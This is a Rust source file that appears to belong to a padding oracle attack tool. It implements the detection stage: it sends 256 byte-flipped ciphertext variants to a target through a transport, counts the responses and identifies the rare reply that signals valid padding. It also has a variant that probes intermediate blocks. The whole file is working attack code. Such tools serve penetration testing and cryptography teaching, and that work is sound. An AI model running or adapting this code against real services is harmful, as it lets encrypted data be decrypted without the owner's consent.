use std::{collections::HashMap, sync::{Arc, atomic::{AtomicBool, Ordering}}};

use async_trait::async_trait;
use futures::future::join_all;
use rand::{Rng, RngCore, random_range, rng, seq::{IndexedRandom, IteratorRandom, SliceRandom}};
use tokio::{
    select, sync::{Mutex, Semaphore}, task::JoinSet
};
use tokio_util::sync::CancellationToken;

use crate::{errors::DecryptError, transport::Transport};

#[derive(PartialEq, Clone, Copy, Debug)]
pub enum DETECT {
    BASELINE,
    OUTLIER,
}

#[async_trait]
pub trait Detector: 'static + Send + Sync {
    async fn check(
        &self,
        ct: &[u8],
    ) ->  Result<DETECT, DecryptError>;
}

// impl<T: Detector+Clone+'static> DynCloneDetector for T{
//     fn clone_box(&self) -> Box<dyn Detector> {
//         return Box::new(self.clone());
//     }
// }

#[async_trait]
impl<D: Detector+ Clone + ?Sized> Detector for Box<D> {
    async fn check(
        &self,
        ct: &[u8],
    ) ->  Result<DETECT, DecryptError> {
        return self.as_ref().check(ct).await;
    }
}

// impl Clone for Box<dyn Detector>{
//     fn clone(&self) -> Self {
//         return self.clone_box();
//     }
// }

#[derive(Clone)]
pub struct IntermediateDetector {
    base_detector: SimpleDetector,
    pub(crate) block_prefix: Vec<u8>,
    pub(crate) block_suffix: Vec<u8>
}

impl IntermediateDetector{
    pub async fn init(
        ct: &[u8],
        transport: impl Transport,
        blk_size: usize,
        threads: usize,
    ) -> Result<Self, DecryptError>
    where
        Self: Sized,
    {
        let transport_shared = Arc::new(transport);
        let blocks: Vec<Vec<u8>> = ct
        .chunks(blk_size.into())
        .map(|val| Vec::from(val))
        .collect();
        if blocks.len() < 2 {
            return Err(DecryptError::InvalidInput(
                "Not enough blocks for classic attack".into(),
            ));
        }
        let mut found_transport: Option<(SimpleDetector, Vec<u8>, Vec<u8>)> = None;
        for i in 1..blocks.len(){
            let retry = 10;
            for r in 1..retry{
                // additive intermediate algorithm
                
                let ct_prefix = ct[..i*blk_size].to_vec();
                let ct_suffix = ct[(i+1)*blk_size..].to_vec();
                let mut inter_ct = [blocks[i-1].clone(), blocks[i].clone()].concat();
                //scramble the inter ciphertext block in such a way it doesn't affect the suffix much
                inter_ct[0] = inter_ct[0] ^ r as u8;
                let res = _detect(&inter_ct, Some(ct_prefix.clone()), Some(ct_suffix.clone()), transport_shared.clone(), blk_size, threads).await;
                if let Ok(detector) = res {
                    found_transport = Some((detector, ct[..i*blk_size].to_vec(), ct[i*blk_size..].to_vec()));
                    break;
                }
            }
            if found_transport.is_some(){
                break
            }
        }
        
        if let Some((detector, block_prefix, block_suffix)) = found_transport{
            return Ok(Self{base_detector:detector, block_prefix, block_suffix })
        }
        Err(DecryptError::DifferentialResponses("".to_string()))
    }
}

#[async_trait]
impl Detector for IntermediateDetector{
    async fn check(&self, ct: &[u8]) -> Result<DETECT, DecryptError> {
        self.base_detector.check(&ct).await
    }
}

#[derive(Clone)]
pub struct SimpleDetector {
    padding_valid_resp: String,
    transport: Arc<dyn Transport>,
    semaphore: Arc<Semaphore>,
}

impl SimpleDetector {
    pub async fn init(
        ct_prefix: Option<Vec<u8>>,
        ct: &[u8],
        transport: impl Transport,
        blk_size: usize,
        threads: usize,
    ) -> Result<Self, DecryptError>
    where
        Self: Sized,
    {
        _detect(ct, ct_prefix, None, transport, blk_size, threads).await
    }
}

#[async_trait]
impl Detector for SimpleDetector {

    async fn check(&self, ct: &[u8]) -> Result<DETECT, DecryptError> {
        let sem_acquire = self
            .semaphore
            .acquire()
            .await
            .expect("Error: semaphore closed");
        let mut res = DETECT::BASELINE;
        if self.transport.exec(ct, None, None).await == self.padding_valid_resp {
            res = DETECT::OUTLIER;
        }
        drop(sem_acquire);
        return Ok(res);
    }
}

async fn _detect(
    ct: &[u8],
    ct_prefix: Option<Vec<u8>>,
    ct_suffix: Option<Vec<u8>>,
    transport: impl Transport,
    blk_size: usize,
    threads: usize,
) -> Result<SimpleDetector, DecryptError>{
    let semaphore = Arc::new(Semaphore::new(threads));
    let blocks: Vec<Vec<u8>> = ct
        .chunks(blk_size.into())
        .map(|val| Vec::from(val))
        .collect();
    if blocks.len() < 2 {
        return Err(DecryptError::InvalidInput(
            "Not enough blocks for classic attack".into(),
        ));
    }
    // though we could use anything for the first block for a basic padding transport, when we're doing the intermediate transport attack,
    // we need to take the first block as is
    let last_blocks_shared = Vec::from([blocks[blocks.len() - 2].clone(), blocks[blocks.len() - 1].clone()]);

    let response_map_shared: Arc<Mutex<HashMap<String, u16>>> =
        Arc::new(Mutex::new(HashMap::new()));

    let transport_shared = Arc::new(transport);

    let mut futures_set = JoinSet::new();
    for i in 0..=255 {
        let sem_acquire = semaphore
            .clone()
            .acquire_owned()
            .await
            .expect("Error: semaphore closed");
        let mut last_blocks = last_blocks_shared.clone();
        let response_map = response_map_shared.clone();
        let transport = transport_shared.clone();
        let ct_prefix_copy = ct_prefix.clone();
        let ct_suffix_copy = ct_suffix.clone();
        futures_set.spawn(async move {
            last_blocks[0][blk_size as usize - 1] = i;
            let response = transport
                .exec(&last_blocks.iter().flatten().cloned().collect::<Vec<u8>>(), ct_prefix_copy, ct_suffix_copy)
                .await;
            let mut response_map_acquired = response_map.lock().await;
            let num_response = response_map_acquired
                .get(&response)
                .unwrap_or(&0)
                .to_owned();
            response_map_acquired.insert(response, num_response + 1);
            drop(sem_acquire);
        });
    }
    futures_set.join_all().await;
    let response_map_acquired = response_map_shared.lock().await;
    if response_map_acquired.keys().len() <= 1 {
        return Err(DecryptError::DifferentialResponses(
            "No unique responses found".into(),
        ));
    } else if response_map_acquired.keys().len() > 3 {
        println!("too many unique responses found {}, try using the -s parameter to distinguish success/error messages", response_map_acquired.keys().len());
        return Err(DecryptError::DifferentialResponses(
            "Too many unique responses found, may not be from a padding error".into(),
        ));
    }
    let (padding_valid_resp, _) = response_map_acquired
        .iter()
        .min_by_key(|(_k, v)| *v)
        .unwrap();
    let detector = SimpleDetector {
        padding_valid_resp: padding_valid_resp.to_owned(),
        transport: transport_shared.clone(),
        semaphore,
    };
    return Ok(detector);
}